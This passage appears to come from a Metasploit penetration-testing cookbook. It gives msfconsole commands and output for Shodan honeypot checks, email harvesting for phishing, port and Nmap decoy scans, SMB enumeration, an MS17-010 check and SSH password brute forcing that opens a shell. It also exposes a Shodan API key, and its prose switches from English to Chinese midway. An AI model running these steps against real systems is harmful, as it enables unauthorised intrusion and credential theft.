  SHODAN_APIKEY => 1d0obpT0SCLAQsq6yxogEKKh1p6yC2ib\nmsf auxiliary(shodan_honeyscore)\
  \ > set TARGET 83.166.169.248\nTARGET => 83.166.169.248\nmsf auxiliary(shodan_honeyscore)\
  \ > run\n\n[*] Scanning 83.166.169.248\n[-] 83.166.169.248 is not a honeypot\n[*]\
  \ 83.166.169.248 honeyscore: 0.0/1.0\n[*] Auxiliary module execution completed\n\
  msf auxiliary(shodan_honeyscore) >\n```\n\n## Search Engine Domain Email Address\
  \ Collector\n\nCollecting email addresses is a common part of a penetration test,\
  \ allows us to understand the customer footprint on the internet, harvester credentials\
  \ for future brute-force attacks, and phishing campaigns.\n\nTo create a list of\
  \ valid email addresses for the target domain, we can use the Search Engine Domain\
  \ Email Address Collector auxiliary module:\n\n```\nmsf > auxiliary/gather/search_email_collector\n\
  msf auxiliary(search_email_collector) > set DOMAIN packtpub.com\nmsf auxiliary(search_email_collector)\
  \ > set DOMAIN packtpub.com\nDOMAIN => packtpub.com\nmsf auxiliary(search_email_collector)\
  \ > run\n```\n\n```\n[*] Harvesting emails ....\n[*] Searching Google for email\
  \ addresses from packtpub.com\n[*] Extracting emails from Google search results...\n\
  [*] Searching Bing email addresses from packtpub.com\n...\n\n[*] Auxiliary module\
  \ execution completed\nmsf auxiliary(search_email_collector) >\n```\n\nLooking at\
  \ the output, you can see that the module uses Google, Bing, and Yahoo to search\
  \ for valid email addresses for the target domain, and was able to locate 20 email\
  \ addresses for packtpub.com.\n\n## Active information gathering with Metasploit\n\
  \nScanning is an active information gathering technique in which we will now start\
  \ dealing with the target directly. Port scanning is an interesting process of information\
  \ gathering. It involves a deeper search of the target machine, but since active\
  \ port scanning involves reaching out to the target systems, these activities can\
  \ be detected by firewalls and intrusion prevention systems.\n\n## How to do it...\n\
  \nThere are a variety of port scanners available to us within the Metasploit Framework,\
  \ allowing us to properly enumerate the target systems. To list all the available\
  \ portscan modules, you can use the search command, as follows:\n\n## TCP Port Scanner\n\
  \nWe can start by doing a basic TCP portscan with the TCP Port Scanner auxiliary\
  \ module and see what we can find.\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_404_0.png)\n\
  \nSince the TCP Port Scanner auxiliary module does not need administrative privileges\
  \ on the source machine, it can be extremely useful when pivoting.\n\nTo run the\
  \ TCP Port Scanner auxiliary module, we need to set the RHOSTS to the target range\
  \ of our lab 192.168.216.0/24 and set the number of concurrent threads to 100 to\
  \ speed up the scan:\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_404_1.png)\n\n\
  Scanners and most other auxiliary modules use the RHOSTS option instead of RHOST.\n\
  \n```\nmsf > use auxiliary/scanner/portscan/\nmsf auxiliary(tcp) > set RHOSTS 192.168.216.0/24\n\
  RHOSTS => 192.168.216.0/24\nmsf auxiliary(tcp) > set THREADS 100\nTHREADS => 100\n\
  msf auxiliary(tcp) > run\n\n[+] 192.168.216.5:      - 192.168.216.5:22      - TCP\
  \ OPEN\n[+] 192.168.216.10:     - 192.168.216.10:22     - TCP OPEN\n[+] 192.168.216.10:\
  \     - 192.168.216.10:139    - TCP OPEN\n```\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_404_2.png)\n\
  \n```\n[+] 192.168.216.10:  - 192.168.216.10:135  - TCP OPEN\n...\n[+] 192.168.216.10:\
  \  - 192.168.216.10:9300  - TCP OPEN\n[*] Scanned 256 of 256 hosts (100% complete)\n\
  [*] Auxiliary module execution completed\n```\n\nWhen using Metasploit modules,\
  \ you can check the available options for that specific module using the show options\
  \ command and use the show missing command to show the missing values required by\
  \ the module:\n\n```\nmsf auxiliary(tcp) > show missing\n```\n\n```\nModule options\
  \ (auxiliary/scanner/portscan/tcp):\n```\n\n| Name | Current Setting | Required\
  \ | Description |\n| --- | --------------- | -------- | ----------- |\n| RHOSTS\
  \ identifier |  | yes | The target address range or CIDR |\n\n## TCP SYN Port Scanner\n\
  \nThe TCP SYN Port Scanner auxiliary module scans TCP services using a raw SYN scan,\
  \ thus reducing the number of packets, as it never completes the three-way handshake.\
  \ To run the TCP SYN Port Scanner auxiliary module, we will specify the interface,\
  \ set the port range to the first 1000 ports, set the RHOSTS to the target range\
  \ of our lab 192.168.216.0/24, and set the number of concurrent threads to 256 to\
  \ speed up the scan:\n\n```\nmsf > use auxiliary/scanner/portscan/syn\nmsf auxiliary(syn)\
  \ > set INTERFACE eth0\nINTERFACE => eth0\nmsf auxiliary(syn) > set PORTS 1-1000\n\
  PORTS => 1-1000\nmsf auxiliary(syn) > set THREADS 256\nTHREADS => 256\nmsf auxiliary(syn)\
  \ > run\n```\n\n```\n[+] TCP OPEN 192.168.216.10:22\n[+] TCP OPEN 192.168.216.10:135\n\
  [+] TCP OPEN 192.168.216.10:139\n[+] TCP OPEN 192.168.216.10:445\n[*] Scanned 1\
  \ of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\nmsf auxiliary(syn)\
  \ >\n```\n\nOn a Unix-like operating system, the number of concurrent threads can\
  \ be set as high as 256.\n\n## Port scanning—the Nmap way\n\nNmap is the most powerful\
  \ and preferred scanner for security professionals. The usage of Nmap varies from\
  \ novice to an advanced level; we will analyze the various scan techniques in detail.\n\
  \n## Getting ready\n\nYou run Nmap directly from msfconsole, as you normally would\
  \ from the command line. However, if you want to import the results into the Metasploit\
  \ database, you need to run the Nmap scan using the -oX flag, followed by the desired\
  \ filename to generate the XML output file, and then issue the db_import command\
  \ to populate the Metasploit database.\n\n## How to do it...\n\nStarting Nmap from\
  \ Metasploit is easy:\n\n- 1. Launch msfconsole and type in nmap to display the\
  \ list of scan options that Nmap provides:\n  \n      msf > nmap\n\n- 2. The TCP\
  \ connect [-sT] scan is the most basic and default scan type in Nmap. It follows\
  \ the three-way handshake process to detect the open ports on the target machine.\
  \ Let's perform this scan on one of our targets:\n  \n      msf > nmap -sT 192.168.216.10\n\
  \      [*] exec: nmap -sT 192.168.216.10\n  \n      Starting Nmap 7.60 ( https://nmap.org\
  \ ) at 2017-10-19 08:53 EDT\n      Nmap scan report for 192.168.216.10\n      Host\
  \ is up (0.49s latency).\n      Not shown: 976 closed ports\n\n\n\n\n\nPORT STATE\
  \ SERVICE\n22/tcp open ssh\n135/tcp open msrpc\n139/tcp open netbios-ssn\n....\n\
  49158/tcp open unknown\n49159/tcp open unknown\nMAC Address: 00:0C:29:38:B3:A9 (VMware)\n\
  \nNmap done: 1 IP address (1 host up) scanned in 3.25 seconds\n\n正如我们所见，我们使用了 -sT\
  \ 参数，表示我们要执行 TCP 连接扫描。TCP 连接扫描基于三次握手过程，因此，此次扫描返回的结果被认为准确。\n\n在使用 Nmap 且未指定端口范围时，Nmap\
  \ 会扫描每个协议中最常见的 1,000 个端口。\n\n3. SYN 扫描 [-sS] 被认为是一种隐蔽扫描技术，因为它从未在目标和扫描器之间建立完整的连接。因此，它也被称为半开扫描。让我们分析一下对目标进行的\
  \ SYN 扫描：\n\n```\nmsf > nmap -sS 192.168.216.10 -p 22-5000\n[*] exec: nmap -sS 192.168.216.10\
  \ -p 22-5000\n\nStarting Nmap 7.60 ( https://nmap.org ) at 2017-10-19 09:00 EDT\n\
  Nmap scan report for 192.168.216.10\nHost is up (0.00063s latency).\nNot shown:\
  \ 4967 closed ports\nPORT STATE SERVICE\n22/tcp open ssh\n135/tcp open msrpc\n...\n\
  3920/tcp open exasoftport1\n4848/tcp open appserv-http\nMAC Address: 00:0C:29:38:B3:A9\
  \ (VMware)\n\nNmap done: 1 IP address (1 host up) scanned in 685.27 seconds\nmsf\
  \ >\n```\n\n-sS 参数将指示 Nmap 对目标机器执行 SYN 扫描。TCP 连接和 SYN 扫描的输出在大多数情况下是相似的，但唯一的区别在于\
  \ SYN 扫描更难被防火墙和 **入侵检测系统 (IDS)** 检测到。然而，现代防火墙也足以捕获 SYN 扫描。-p 参数显示我们想要扫描的端口号范围。使用\
  \ -p 0-65535，或简写为 -p -，将扫描所有可用端口。\n\n4. UDP 扫描 [-sU] 是识别目标上开放 UDP 端口的扫描技术。向目标机器发送\
  \ 0 字节的 UDP 数据包，接收到 ICMP 端口不可达消息表明端口已关闭；否则，认为端口是开放的。它可以按以下方式使用：\n\n```\nmsf > nmap\
  \ -sU 192.168.216.10\n[*] exec: nmap -sU 192.168.216.10\n\nStarting Nmap 7.60 (\
  \ https://nmap.org ) at 2017-10-19 09:09 EDT\nNmap scan report for 192.168.216.10\n\
  Host is up (0.00064s latency).\nNot shown: 994 closed ports\nPORT STATE SERVICE\n\
  137/udp open netbios-ns\n138/udp open|filtered netbios-dgm\n500/udp open|filtered\
  \ isakmp\n4500/udp open|filtered nat-t-ike\n5353/udp open|filtered zeroconf\n5355/udp\
  \ open|filtered llmnr\nMAC Address: 00:0C:29:38:B3:A9 (VMware)\n\nNmap done: 1 IP\
  \ address (1 host up) scanned in 319.56 seconds\nmsf >\n```\n\n之前的命令将检查 192.168.56.102\
  \ 上 UDP 协议最常见的 1,000 个端口是否开放。\n\n## How it works...\n\n我们分析了三种不同类型的 Nmap 扫描，它们在渗透测试期间非常有帮助。Nmap\
  \ 为扫描目标机器提供了许多不同的模式。在这里，我们将重点关注三种扫描类型，即 TCP 连接扫描、SYN 隐蔽扫描和 UDP 扫描。Nmap 的不同扫描选项也可以组合在一次扫描中，以对目标执行更高级、更复杂的扫描。让我们继续前进并开始扫描过程。\n\
  \n在渗透测试期间，扫描过程可以提供大量有用的结果。由于此处收集的信息将构成渗透测试的基础，因此强烈建议正确了解扫描类型。现在让我们更深入地了解我们刚刚学习的每种扫描技术。\n\
  \nTCP 连接扫描是最基本的扫描技术，其中与正在测试的端口建立了完整的连接。它使用操作系统的网络功能来建立连接。扫描器向目标机器发送 SYN 数据包。如果端口开放，它会向扫描器返回\
  \ ACK 消息。扫描器然后向目标发送 ACK 数据包，显示连接成功建立。这称为三次握手过程。连接在打开后立即终止。该技术有其优点，但很容易被防火墙和 IDS\
  \ 追踪。\n\nSYN 扫描是另一种类型的 TCP 扫描，但它从未与目标建立完整的连接。它不使用操作系统的网络功能；相反，它生成原始 IP 数据包并监控响应。如果端口开放，则目标将以\
  \ ACK 消息进行响应。扫描器然后发送重置连接 (RST) 消息并结束连接。因此，它也称为半开扫描。这被认为是一种隐蔽扫描技术，因为它可以避免在某些配置不当的防火墙和\
  \ IDS 中触发警报。\n\nUDP 扫描是一种无连接扫描技术；因此，无论数据包是否已被目标接收，都不会向扫描器发送通知。如果端口关闭，则会向扫描器发送 ICMP\
  \ 端口不可达消息。如果未收到消息，则端口被报告为开放。此方法可能会返回错误结果，因为防火墙可以阻止数据包，因此不会生成响应消息，扫描器将报告端口为开放。\n\n\
  ## There's more...\n\n让我们进一步了解 Nmap 扫描，并看看如何将不同类型的扫描组合在一起。\n\n## Operating system\
  \ and version detection\n\n除了端口扫描之外，Nmap 还提供了一些高级选项。这些选项可以帮助我们获取有关目标的更多信息。其中最广泛使用的选项之一是\
  \ **操作系统识别 [-O]**。这可以帮助我们识别目标机器上运行的操作系统。\n\n操作系统检测扫描输出如下所示：\n\n```\nmsf > nmap -O\
  \ 192.168.216.129\n[*] exec: nmap -O 192.168.216.129\n\nStarting Nmap 7.60 ( https://nmap.org\
  \ ) at 2017-10-19 09:28 EDT\nNmap scan report for 192.168.216.129\nHost is up (0.0012s\
  \ latency).\nNot shown: 977 closed ports\nPORT STATE SERVICE\n21/tcp open ftp\n\
  22/tcp open ssh\n23/tcp open telnet\n...\n\nRunning: Linux 2.6.X\nOS CPE: cpe:/o:linux:linux_kernel:2.6\n\
  OS details: Linux 2.6.9 - 2.6.33\nNetwork Distance: 1 hop\n\nOS detection performed.\
  \ Please report any incorrect results at https://nmap.org/submit/ .\nNmap done:\
  \ 1 IP address (1 host up) scanned in 3.91 seconds\nmsf >\n```\n\n正如我们所见，Nmap 已成功检测到目标机器的操作系统。这可以简化我们根据目标的操作系统寻找合适的漏洞利用的任务。\n\
  \n另一个广泛使用的 Nmap 选项是不同开放端口的 **版本检测 [-sV]**。它可以与我们之前看到的任何扫描类型混合使用，以添加有关目标开放端口上运行的服务版本的信息：\n\
  \n```\nmsf > nmap -sV 192.168.216.129\n[*] exec: nmap -sV 192.168.216.129\n\nStarting\
  \ Nmap 7.60 ( https://nmap.org ) at 2017-10-19 09:30 EDT\nNmap scan report for 192.168.216.129\n\
  Host is up (0.00049s latency).\nNot shown: 977 closed ports\nPORT STATE SERVICE\
  \ VERSION\n...\n\nirc.Metasploitable.LAN; OSs: Unix, Linux; CPE:\ncpe:/o:linux:linux_kernel\n\
  \nService detection performed. Please report any incorrect results at https://nmap.org/submit/\
  \ .\nNmap done: 1 IP address (1 host up) scanned in 13.57 seconds\nmsf >\n```\n\n\
  正如我们所见，我们的扫描输出中添加了一个额外的版本列，报告了目标机器上运行的不同服务的版本。\n\n## Increasing anonymity\n\n有时以匿名方式执行扫描是必不可少的。如果您在不使用安全措施的情况下执行扫描，防火墙和\
  \ IDS 日志可能会泄露您的 IP 地址。Nmap 中提供的一项功能称为 **诱饵 (-D)**。\n\n诱饵选项并不能阻止您的 IP 地址被记录在防火墙和\
  \ IDS 的日志文件中，但它会使扫描看起来很可怕。它在日志文件中添加了其他流量，从而给人一种印象，即有多个其他攻击者同时扫描该机器。因此，如果您添加两个诱饵\
  \ IP 地址，日志文件将显示请求数据包来自三个不同的 IP 地址；一个是您的，另两个是您添加的假地址：\n\n```\nmsf > nmap -sT 192.168.216.10\
  \ -D 192.168.216.13,192.168.216.25\n```\n\n\n\n\n\n这个扫描示例展示了 -D 参数的使用。-D 操作符后的 IP\
  \ 地址是伪造的 IP 地址，它们会连同原始 IP 地址一起出现在目标机器的网络日志文件中。此过程会让网络管理员感到困惑，并在其脑中产生怀疑，认为这三个 IP\
  \ 地址都是伪造的或被欺骗的。但添加过多的诱饵地址会影响扫描结果；因此，你应仅使用有限数量的诱饵地址。\n\n## 端口扫描——db_nmap 方式\n\n使用\
  \ `db_nmap` 命令，我们可以对目标运行 Nmap 并自动将扫描结果存储到数据库中，而无需使用 `db_import` 命令。\n\n### 准备工作\n\
  \n`db_nmap` 命令是 `msfconsole` 的一部分，因此你只需启动 `msfconsole` 并使用 `db_nmap`，就像在命令行上使用 `nmap`\
  \ 一样。\n\n### 操作方法...\n\n在第 11 章 *Metasploit 安全专业人士快速技巧* 中，我们已经谈到了 `db_nmap` 的基本用法，现在我们将看看一些更高级的功能。在下面的示例中，你将学习如何使用其中一些功能：\n\
  \n```\nmsf > db_nmap -Pn -sTV -T4 --open --min-parallelism 64 --version-all\n192.168.216.10\
  \ -p -\n[*] Nmap: Starting Nmap 7.60 ( https://nmap.org ) at 2017-10-20 06:33 EDT\n\
  [*] Nmap: Nmap scan report for 192.168.216.10\n[*] Nmap: Host is up (0.00044s latency).\n\
  [*] Nmap: Not shown: 54809 closed ports, 10678 filtered ports\n[*] Nmap: Some closed\
  \ ports may be reported as filtered due to --defeat-rst-ratelimit\n...\n[*] Nmap:\
  \ 50560/tcp open unknown\n[*] Nmap: 50561/tcp open unknown\n[*] Nmap: Service Info:\
  \ OSs: Windows, Windows Server 2008 R2 - 2012; Device: remote management; CPE: cpe:/o:microsoft:windows\n\
  [*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/\
  \ .\n[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 522.38 seconds\nmsf\
  \ >\n```\n\n我们使用 db_nmap 配合 -Pn 选项将所有主机视为在线并跳过主机发现，-sTV 执行 TCP 连接扫描，V 标志对发现的开放端口进行版本扫描，以及\
  \ -T4 设置更高的时序模板以使扫描运行更快。--open 选项仅显示开放端口，--min-parallelism 用于指定同时进行的最小并行进程数量，而 --version-all\
  \ 则尝试每个探测以识别在开放端口上运行的服务的更具体版本。要运行扫描，我们设置目标主机的 IP 地址并使用 -p - 指定我们想要扫描全部 65535 个端口。\n\
  \n## Nmap 脚本引擎\n\nNmap 脚本引擎 NSE 是 Nmap 最强大和最灵活的功能之一，有效地将 Nmap 变为漏洞扫描器。NSE 几乎有 600\
  \ 个脚本，分为多个类别，范围从较安全的发现脚本到更具侵入性的脚本，如暴力破解、利用和拒绝服务。你可以在 Kali Linux 的 /usr/share/nmap/scripts\
  \ 目录中找到 NSE 脚本，或简单地通过 locate 命令搜索通配符 *.nse。\n\n运行 NSE 脚本的基本语法如下：\n\n```\nnmap --script\
  \ <scriptname> <host ip>\n```\n\ndb_nmap 命令也适用，因此让我们使用 NSE 尝试查找一些 HTTP/HTTPS 漏洞：\n\
  \n```\nmsf > db_nmap --open -sTV -Pn -p 80,443,8000,8080,8585 --script=http-vhosts,http-userdir-enum,http-apache-negotiation,http-backup-finder,http-config-backup,http-default-accounts,http-methods,http-method-tamper,http-passwd,http-robots.txt,ssl-poodle,ssl-heartbleed,http-webdav-scan,http-iis-webdav-vuln\
  \ 192.168.216.10\n[*] Nmap: Starting Nmap 7.60 ( https://nmap.org ) at 2017-10-20\
  \ 10:26 EDT\n[*] Nmap: Nmap scan report for 192.168.216.10\n[*] Nmap: Host is up\
  \ (0.00068s latency).\n[*] Nmap: Not shown: 3 closed ports\n[*] Nmap: PORT STATE\
  \ SERVICE VERSION\n[*] Nmap: 8080/tcp open http Oracle GlassFish 4.0 (Servlet 3.1;\
  \ JSP 2.3; Java 1.8)\n[*] Nmap: | http-backup-finder:\n...\n[*] Nmap: |_127 names\
  \ had status 200\n[*] Nmap: Service detection performed. Please report any incorrect\
  \ results at https://nmap.org/submit/ .\n[*] Nmap: Nmap done: 1 IP address (1 host\
  \ up) scanned in 293.24 seconds\nmsf >\n```\n\n查看输出，我们可以看到一些潜在有风险的 HTTP 方法，例如 PUT、DELETE\
  \ 和 TRACE。\n\n## 使用 ARP Sweep 进行主机发现\n\nARP Sweep 允许我们使用 ARP 请求枚举本地网络中的活动主机，为我们提供一种简单快速的方式来识别可能的攻击目标。\n\
  \n### 准备工作\n\n当你的目标系统位于与攻击机器相同的局域网中时，你可以通过执行 ARP 扫描来枚举系统。\n\n### 操作方法...\n\n- 1.\
  \ 要在 Metasploit 中使用 ARP 枚举系统，你可以使用 ARP Sweep 本地网络发现辅助模块。你只需在 RHOSTS 中设置目标地址范围，设置并发线程数，然后运行该模块：\n\
  \n```\nmsf > use auxiliary/scanner/discovery/arp_sweep\nmsf auxiliary(arp_sweep)\
  \ > set RHOSTS 192.168.216.0/24\nRHOSTS => 192.168.216.0/24\nmsf auxiliary(arp_sweep)\
  \ > set THREADS 256\nTHREADS => 256\nmsf auxiliary(arp_sweep) > run\n\n[+] 192.168.216.1\
  \ appears to be up (VMware, Inc.).\n[+] 192.168.216.2 appears to be up (VMware,\
  \ Inc.).\n[+] 192.168.216.10 appears to be up (VMware, Inc.).\n[+] 192.168.216.129\
  \ appears to be up (VMware, Inc.).\n[+] 192.168.216.254 appears to be up (VMware,\
  \ Inc.).\n[*] Scanned 256 of 256 hosts (100% complete)\n[*] Auxiliary module execution\
  \ completed\nmsf auxiliary(arp_sweep) >\n```\n\n- 2. 如果启用，结果将存储在 Metasploit 数据库中。要显示发现的主机，你可以使用\
  \ hosts 命令：\n\n```\nmsf auxiliary(arp_sweep) > hosts\n\nHosts\n=====\n\naddress\
  \          mac              name os_name os_flavor os_sp\npurpose info comments\n\
  ------- ---- --------          ---- ------- --------- ----\n-------- ---- --------\n\
  192.168.216.1    00:50:56:c0:00:08\n192.168.216.2    00:50:56:e3:fd:60\n192.168.216.10\
  \   00:0c:29:38:b3:a9\n192.168.216.129  00:0c:29:79:a6:61\n192.168.216.254  00:50:56:fe:6a:62\n\
  \nmsf auxiliary(arp_sweep) >\n```\n\n## UDP 服务扫描器\n\nUDP 服务扫描器辅助模块允许我们检测有趣的 UDP\
  \ 服务。由于 UDP 是无连接协议，因此探测起来比 TCP 更困难。使用 UDP 服务扫描器之类的辅助模块可以帮助你在及时的情况下找到一些容易获取的目标。\n\
  \n### 操作方法...\n\n要运行 UDP 服务扫描器，选择 auxiliary/scanner/discovery/udp_sweep 模块并在 RHOSTS\
  \ 中设置目标地址范围：\n\n```\nmsf > use auxiliary/scanner/discovery/udp_sweep\nmsf auxiliary(udp_sweep)\
  \ > set RHOSTS 192.168.216.0/24\nRHOSTS => 192.168.216.0/24\nmsf auxiliary(udp_sweep)\
  \ > run\n\n[*] Sending 13 probes to 192.168.216.0->192.168.216.255 (256 hosts)\n\
  [*] Discovered NetBIOS on 192.168.216.1:137 (MACBOOK-PRO:<00>:U\n:00:50:56:c0:00:08)\n\
  ...\n\n[*] Discovered Portmap on 192.168.216.129:111 (100000 v2 TCP(111), 100000\
  \ v2 UDP(111), 100024 v1 UDP(52986), 100024 v1 TCP(53621), 100003 v2 UDP(2049),\
  \ 100003 v3 UDP(2049), 100003 v4 UDP(2049), 100021 v1 UDP(49681), 100021 v3 UDP(49681),\
  \ 100021 v4 UDP(49681), 100003 v2 TCP(2049), 100003 v3 TCP(2049), 100003 v4 TCP(2049),\
  \ 100021 v1 TCP(60203), 100021 v3 TCP(60203), 100021 v4 TCP(60203), 100005 v1 UDP(48062),\
  \ 100005 v1 TCP(34047), 100005 v2 UDP(48062), 100005 v2 TCP(34047), 100005 v3 UDP(48062),\
  \ 100005 v3 TCP(34047))\n[*] Discovered DNS on 192.168.216.129:53 (BIND 9.4.2)\n\
  [*] Scanned 256 of 256 hosts (100% complete)\n[*] Auxiliary module execution completed\n\
  msf auxiliary(udp_sweep) >\n```\n\nUDP 服务扫描器模块能够发现我们的目标在 53 端口上运行 BIND DNS。\n\n\
  ## SMB 扫描和枚举\n\n多年来，服务器消息块 SMB 协议，即在 Microsoft Windows 中实现的网络文件共享协议，已证明是被滥用最严重的协议之一，允许从共享和用户枚举到远程代码执行。\n\
  \n### 操作方法...\n\n- 1. 使用 SMB 共享枚举辅助模块无需身份验证，允许我们收集一些有价值的信息，例如共享名称和操作系统版本及服务包：\n\
  ```\nmsf > use auxiliary/scanner/smb/smb_enumshares\nmsf auxiliary(smb_enumshares)\
  \ > set RHOSTS 192.168.216.10,129\nRHOSTS => 192.168.216.10,129\nmsf auxiliary(smb_enumshares)\
  \ > run\n...\n[+] 192.168.216.129:139 - IPC$ - (I) IPC Service\n(metasploitable\
  \ server (Samba 3.0.20-Debian))\n[+] 192.168.216.129:139 - ADMIN$ - (I) IPC Service\n\
  (metasploitable server (Samba 3.0.20-Debian))\n[*] Scanned 2 of 2 hosts (100% complete)\n\
  [*] Auxiliary module execution completed\nmsf auxiliary(smb_enumshares) >\n```\n\
  \n\n\n\n\n2. SMB Share Enumeration 辅助模块在执行后渗透时也非常有用。通过提供有效的凭据，我们可以轻松枚举共享并列出文件：\n\
  \n![](img/6b6e557533100c0e47951d0e5e14c4ee_418_0.png)\n\nMetasploit 有多个 SMB 扫描辅助模块。接下来我们将查看其中一些最有用的模块。\n\
  \n3. SMB Version Detection 辅助模块会显示每个目标系统的 SMB 版本：\n\n```\nmsf > use auxiliary/scanner/smb/smb_version\n\
  msf auxiliary(smb_version) > set RHOSTS 192.168.216.10\nRHOSTS => 192.168.216.10\n\
  msf auxiliary(smb_version) > run\n\n[+] 192.168.216.10:445 - Host is running Windows\
  \ 2008 R2 Standard SP1 (build:7601) (name:VAGRANT-2008R2)\n(workgroup:WORKGROUP\
  \ )\n[*] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\n\
  msf auxiliary(smb_version) >\n```\n\n4. SMB User Enumeration 辅助模块允许我们通过 SAM RPC\
  \ 服务确定存在哪些本地用户：\n\n```\nmsf > use auxiliary/scanner/smb/smb_enumusers\nmsf auxiliary(smb_enumusers)\
  \ > set SMBPASS vagrant\nSMBPASS => vagrant\nmsf auxiliary(smb_enumusers) > set\
  \ SMBUSER vagrant\nSMBUSER => vagrant\nmsf auxiliary(smb_enumusers) > set RHOSTS\
  \ 192.168.216.10\nRHOSTS => 192.168.216.10\nmsf auxiliary(smb_enumusers) > run\n\
  \n[+] 192.168.216.10:445 - VAGRANT-2008R2 [ Administrator, anakin_skywalker, arto_detoo,\
  \ ben_kenobi, boba_fett, chewbacca, c_three_pio, darth_vader, greedo, Guest, han_solo,\
  \ jabba_hutt, jarjar_binks, kylo_ren, lando_calrissian, leia_organa, luke_skywalker,\
  \ sshd, sshd_server, vagrant ] ( LockoutTries=0 PasswordMin=0 )\n[*] Scanned 1 of\
  \ 1 hosts (100% complete)\n[*] Auxiliary module execution completed\nmsf auxiliary(smb_enumusers)\
  \ >\n```\n\n5. SMB Login Check Scanner 辅助模块将测试一系列机器上的 SMB 登录并报告成功的登录：\n\n```\nmsf\
  \ > use auxiliary/scanner/smb/smb_login\nmsf auxiliary(smb_login) > set RHOSTS 192.168.216.10\n\
  RHOSTS => 192.168.216.10\nmsf auxiliary(smb_login) > set SMBUSER vagrant\nSMBUSER\
  \ => vagrant\nmsf auxiliary(smb_login) > set PASS_FILE /root/password.lst\nPASS_FILE\
  \ => /root/password.lst\nmsf auxiliary(smb_login) > run\n...\n\n[*] 192.168.216.10:445\
  \ - 192.168.216.10:445 - Domain is ignored for user vagrant\n[*] Scanned 1 of 1\
  \ hosts (100% complete)\n[*] Auxiliary module execution completed\nmsf auxiliary(smb_login)\
  \ >\n```\n\n6. MS17-010 SMB RCE Detection 辅助模块使用信息泄露来确定 MS17-010 是否已修补。具体来说，它连接到\
  \ IPC$ 树并尝试在 FID 0 上进行事务。如果返回的状态为 STATUS_INSUFF_SERVER_RESOURCES，则该机器没有 MS17-010\
  \ 补丁。如果机器缺少 MS17-010 补丁，模块将检查是否存在现有的 DoublePulsar（ring 0 shellcode/恶意软件）感染。该模块在默认服务器配置下不需要有效的\
  \ SMB 凭据。它可以以用户 \\ 的身份登录并连接到 IPC$：\n\n```\nmsf > use auxiliary/scanner/smb/smb_ms17_010\n\
  msf auxiliary(smb_ms17_010) > set RHOSTS 192.168.216.10\nRHOSTS => 192.168.216.10\n\
  msf auxiliary(smb_ms17_010) > run\n\n[+] 192.168.216.10:445 - Host is likely VULNERABLE\
  \ to\nMS17-010! (Windows Server 2008 R2 Standard 7601 Service Pack 1)\n[*] Scanned\
  \ 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\nmsf auxiliary(smb_ms17_010)\
  \ >\n```\n\n7. Metasploit 有大量 SMB 辅助模块值得尝试。要列出所有可用的 SMB 模块，可以按 Tab 键显示 auxiliary/scanner/smb/\
  \ 下所有可用的模块：\n\n```\nmsf > use auxiliary/scanner/smb/\n...\n\nuse auxiliary/scanner/smb/smb_ms17_010\n\
  use auxiliary/scanner/smb/smb_uninit_cred\nuse auxiliary/scanner/smb/smb_version\n\
  msf > use auxiliary/scanner/smb/\n```\n\n## 使用 SSH Version Scanner 检测 SSH 版本\n\n\
  SSH 是一种广泛使用的应用程序，提供安全的远程登录。它使用强大的加密技术提供身份验证和保密性。在本教程中，我们将检测目标上当前运行的 SSH 版本。通过此 SSH\
  \ Version Scanner，我们可以确定目标是否配备了任何易受攻击的 SSH 版本，如果是，我们可以继续下一步。\n\n## 准备工作\n\n之前的扫描显示目标系统上\
  \ TCP 端口 22 是开放的，因此我们将使用 SSH Version Scanner 辅助模块获取目标系统上运行的 SSH 版本信息。\n\n## 如何操作...\n\
  \n+   1. 要扫描网络上的 SSH 服务器，请使用 `auxiliary/scanner/ssh/ssh_version` 辅助模块，设置 RHOSTS\
  \ 中的目标地址范围，并将并发线程数设置为 256：\n\n```\nmsf > use auxiliary/scanner/ssh/ssh_version\n\
  msf auxiliary(ssh_version) > set RHOSTS 192.168.216.0/24\nRHOSTS => 192.168.216.0/24\n\
  msf auxiliary(ssh_version) > set THREADS 256\nTHREADS => 256\nmsf auxiliary(ssh_version)\
  \ > run\n\n...\n[*] Scanned 133 of 256 hosts (51% complete)\n[*] Scanned 232 of\
  \ 256 hosts (90% complete)\n[*] Scanned 250 of 256 hosts (97% complete)\n[*] Scanned\
  \ 255 of 256 hosts (99% complete)\n[*] Scanned 256 of 256 hosts (100% complete)\n\
  [*] Auxiliary module execution completed\nmsf auxiliary(ssh_version) >\n```\n\n\
  因此，在我们的扫描中，我们在目标地址范围内发现了一些活动的 SSH 版本。一旦发现 SSH 版本，我们就可以为该特定版本搜索漏洞。\n\n+   2. 要搜索默认或可猜测的凭据，可以使用\
  \ SSH Login Check Scanner 辅助模块测试一系列机器上的 SSH 登录并报告成功的登录：\n\n```\nmsf > use auxiliary/scanner/ssh/ssh_login\n\
  msf auxiliary(ssh_login) > set USERNAME user\nUSERNAME => user\nmsf auxiliary(ssh_login)\
  \ > set PASS_FILE /root/password.lst\nPASS_FILE => /root/password.lst\nmsf auxiliary(ssh_login)\
  \ > set RHOSTS 192.168.216.10,129\nRHOSTS => 192.168.216.10,129\nmsf auxiliary(ssh_login)\
  \ > set STOP_ON_SUCCESS true\nSTOP_ON_SUCCESS => true\nmsf auxiliary(ssh_login)\
  \ > set THREADS 256\nTHREADS => 256\nmsf auxiliary(ssh_login) > run\n```\n\n```\n\
  [*] Scanned 1 of 2 hosts (50% complete)\n[+] 192.168.216.129:22 - Success: 'user:user'\
  \ 'uid=1001(user) gid=1001(user) groups=1001(user) Linux metasploitable 2.6.24-16-server\
  \ #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux '\n[*] Command shell session\
  \ 1 opened (192.168.216.5:39227 -> 192.168.216.129:22) at 2017-10-21 06:11:14 -0400\n\
  [*] Scanned 2 of 2 hosts (100% complete)\n[*] Auxiliary module execution completed\n\
  msf auxiliary(ssh_login) >\n```\n\n查看输出，我们很幸运地在 Metasploitable 2 目标机器上使用凭据 user:user\
  \ 获得了会话。\n\n+   3. 要与新会话交互，请使用 sessions 命令并带 -i 选项与会话交互并提供会话 ID，在本例中为 1：\n\n```\n\
